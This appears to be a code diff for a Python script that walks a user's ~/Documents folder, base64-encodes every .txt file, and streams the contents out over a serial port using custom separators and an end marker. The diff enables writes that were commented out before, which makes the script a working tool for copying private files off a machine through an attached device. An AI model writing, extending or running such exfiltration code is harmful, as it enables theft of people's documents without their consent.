@@ -1,4 +1,4 @@
-import termios, os, base64, serial.tools.list_ports
+import termios, os, base64, time, serial.tools.list_ports
 class SerialPort(object):
     def __init__(self, serialport, bps):
         self.fd = os.open(serialport, os.O_RDWR | os.O_NOCTTY | os.O_NDELAY)
@@ -19,9 +19,6 @@ class SerialPort(object):
         termios.tcsetattr(self.fd, termios.TCSANOW, attrs)
     def write(self, str):
         os.write(self.fd, str)
-    def write_byte(self, byte):
-        os.write(self.fd, chr(byte))
-
 
 port = ""
 ports = list(serial.tools.list_ports.comports())
@@ -33,10 +30,12 @@ for p in ports:
 
 bps = 115200
 port = SerialPort(port, bps)
-dirHome = os.path.expanduser("~")
+dirHome = os.path.expanduser("~/Documents")
 exclude = []
-print('dirHome = ' + dirHome)
-
+separator = "~".encode('utf-8') # fg==
+separatorP = "@".encode('utf-8');
+end = "~~".encode('utf-8') # fn4=
+ext = base64.b64encode(".txt".encode('utf-8')) # LnR4dA==
 for root, dirs, files in os.walk(dirHome):
     for directory in dirs:
         if directory.startswith("."):
@@ -46,14 +45,20 @@ for root, dirs, files in os.walk(dirHome, topdown = True):
     dirs[:] = [d for d in dirs if d not in exclude]
     for file in files:
         filePath = os.path.join(root, file)
-        if file.endswith(".jpg") or file.endswith(".jpeg") or file.endswith(".png") or file.endswith(".txt"):
+        if file.endswith(".txt"):
             with open(filePath, "rb") as f:
                 send = base64.b64encode(f.read())
-            #print(send)
-
-            startOfFile = base64.b64encode("§.XXX")
-            #port.write(startOfFile)
-            #port.write(send)
-
+            
+            port.write(send)
+            #time.sleep(10)
+            port.write(separatorP)
+            #time.sleep(2)
+            port.write(ext)
+            #time.sleep(2)
+            port.write(separator)
+            #time.sleep(2)
+            print("[Invio]") 
         else:
             pass
+
+port.write(end)
